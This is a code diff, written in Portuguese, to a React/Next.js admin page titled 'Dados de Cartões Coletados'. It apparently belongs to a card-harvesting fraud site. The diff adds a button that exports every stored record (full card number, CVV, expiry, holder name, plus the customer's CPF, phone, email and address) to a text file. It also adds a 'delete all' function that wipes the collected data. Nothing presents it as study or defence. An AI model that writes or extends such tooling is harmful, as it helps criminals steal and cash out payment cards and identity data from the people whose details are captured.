@@ -1,7 +1,7 @@
 'use client'
 
 import { useState } from 'react'
-import { Eye, EyeOff, CreditCard, User, Calendar, Lock } from 'lucide-react'
+import { Eye, EyeOff, CreditCard, User, Calendar, Lock, Download, Trash2 } from 'lucide-react'
 
 interface CardData {
   id: string
@@ -71,6 +71,83 @@ export default function AdminPage() {
     return number.replace(/\d(?=\d{4})/g, '*')
   }
 
+  const downloadAsTxt = () => {
+    let txtContent = '='.repeat(80) + '\n'
+    txtContent += 'DADOS DE CARTÕES COLETADOS\n'
+    txtContent += 'Exportado em: ' + new Date().toLocaleString('pt-BR') + '\n'
+    txtContent += '='.repeat(80) + '\n\n'
+
+    cardData.forEach((item, index) => {
+      txtContent += `\n${'='.repeat(80)}\n`
+      txtContent += `REGISTRO #${index + 1}\n`
+      txtContent += `${'='.repeat(80)}\n`
+      txtContent += `ID: ${item.id}\n`
+      txtContent += `Data/Hora: ${formatDate(item.timestamp)}\n\n`
+      
+      txtContent += `--- DADOS DO CLIENTE ---\n`
+      txtContent += `Nome: ${item.customer.name}\n`
+      txtContent += `CPF: ${item.customer.cpf}\n`
+      txtContent += `Telefone: ${item.customer.phone}\n`
+      txtContent += `Email: ${item.customer.email}\n`
+      txtContent += `Endereço: ${item.customer.address}\n\n`
+      
+      txtContent += `--- DADOS DO CARTÃO ---\n`
+      txtContent += `Número: ${item.card.number}\n`
+      txtContent += `Titular: ${item.card.holderName}\n`
+      txtContent += `Validade: ${item.card.expiryDate}\n`
+      txtContent += `CVV: ${item.card.cvv}\n\n`
+      
+      txtContent += `--- PRODUTO ---\n`
+      txtContent += `Nome: ${item.product.name}\n`
+      txtContent += `Quantidade: ${item.product.quantity}\n`
+      txtContent += `Preço: ${formatCurrency(item.product.price)}\n`
+      txtContent += `Total: ${formatCurrency(item.total)}\n`
+    })
+
+    txtContent += '\n' + '='.repeat(80) + '\n'
+    txtContent += `Total de registros: ${cardData.length}\n`
+    txtContent += '='.repeat(80) + '\n'
+
+    const blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    const link = document.createElement('a')
+    link.href = url
+    link.download = `cartoes_${new Date().getTime()}.txt`
+    document.body.appendChild(link)
+    link.click()
+    document.body.removeChild(link)
+    URL.revokeObjectURL(url)
+  }
+
+  const deleteAllData = async () => {
+    if (!confirm('⚠️ ATENÇÃO! Isso irá apagar TODOS os dados de cartões. Esta ação não pode ser desfeita. Deseja continuar?')) {
+      return
+    }
+
+    if (!confirm('Tem certeza absoluta? Digite OK para confirmar.') && prompt('Digite OK para confirmar:')?.toUpperCase() !== 'OK') {
+      return
+    }
+
+    try {
+      const response = await fetch('/api/delete-card-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password })
+      })
+
+      const result = await response.json()
+
+      if (result.success) {
+        setCardData([])
+        alert('✅ Todos os dados foram apagados com sucesso!')
+      } else {
+        alert('❌ Erro ao apagar dados: ' + result.error)
+      }
+    } catch (err) {
+      alert('❌ Erro ao conectar com o servidor')
+    }
+  }
+
   const formatCurrency = (value: number) => {
     return new Intl.NumberFormat('pt-BR', {
       style: 'currency',
@@ -127,8 +204,30 @@ export default function AdminPage() {
     <div className="min-h-screen bg-gray-50 p-4 md:p-8">
       <div className="max-w-7xl mx-auto">
         <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
-          <h1 className="text-3xl font-bold text-gray-800 mb-2">Dados de Cartões Coletados</h1>
-          <p className="text-gray-600">Total de registros: {cardData.length}</p>
+          <div className="flex justify-between items-start mb-4">
+            <div>
+              <h1 className="text-3xl font-bold text-gray-800 mb-2">Dados de Cartões Coletados</h1>
+              <p className="text-gray-600">Total de registros: {cardData.length}</p>
+            </div>
+            <div className="flex gap-3">
+              <button
+                onClick={downloadAsTxt}
+                disabled={cardData.length === 0}
+                className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                <Download className="w-5 h-5" />
+                Baixar TXT
+              </button>
+              <button
+                onClick={deleteAllData}
+                disabled={cardData.length === 0}
+                className="flex items-center gap-2 bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                <Trash2 className="w-5 h-5" />
+                Apagar Tudo
+              </button>
+            </div>
+          </div>
         </div>
 
         {cardData.length === 0 ? (
